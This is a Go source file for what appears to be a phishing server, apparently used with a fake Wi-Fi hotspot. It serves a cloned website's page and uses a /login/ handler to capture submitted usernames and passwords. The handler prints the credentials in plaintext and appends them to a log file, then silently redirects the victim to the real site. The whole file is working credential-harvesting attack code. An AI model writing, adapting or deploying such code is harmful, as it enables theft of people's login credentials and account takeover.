package serve

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"

	"../build"
)

const _successMsg = "Hotspot full. Try again later."
const successMsg = `<script>window.location="%s"</script>`
const msg404 = "404 Not Found."

var fileIoMutex sync.Mutex

//Serve serves the specified folder.
func Serve(website build.Website, port uint) {

	_logfile := website.WebsiteName + ".log"

	logFile, _ := os.OpenFile(_logfile,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer logFile.Close()

	http.HandleFunc("/",
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, website.IndexFile)
		})

	http.HandleFunc("/login/",
		func(w http.ResponseWriter, r *http.Request) {
			handleLogin(website, logFile, w, r)
		})

	http.HandleFunc(website.ResHandleMatch,
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, r.URL.Path[1:])
		})

	addr := ":" + fmt.Sprint(port)

	log.Printf("Serving on %s", addr)
	log.Fatal(http.ListenAndServe(addr, nil))

}

func handleLogin(
	web build.Website,
	logFile *os.File,
	w http.ResponseWriter,
	r *http.Request) {

	if r.Method != "POST" {
		fmt.Fprintln(w, msg404)
		return
	}

	fmt.Fprintf(w, successMsg, web.WebLink)

	body, err := ioutil.ReadAll(r.Body)

	if err != nil {
		fmt.Fprintln(w, msg404)
		log.Print(err)
	}

	values, err := url.ParseQuery(string(body))

	if err != nil {
		log.Printf(err.Error())
		return
	}

	if len(values["user"]) != 1 || len(values["pass"]) != 1 {
		log.Println("Wrong request.")
		log.Println(values["user"])
		log.Println(values["pass"])
		return
	}
	user := values["user"][0]
	pass := values["pass"][0]

	log.Printf("User: %s, Pass: %s", user, pass)

	fileIoMutex.Lock()
	fmt.Fprintf(logFile, "user: %s, pass: %s\n", user, pass)
	fileIoMutex.Unlock()

}

func serveFile(
	w http.ResponseWriter,
	r *http.Request,
	filename string) error {

	log.Printf(
		"%s wanted %s and got %s.",
		r.RemoteAddr,
		r.URL,
		filename)

	http.ServeFile(w, r, filename)
	return nil
}
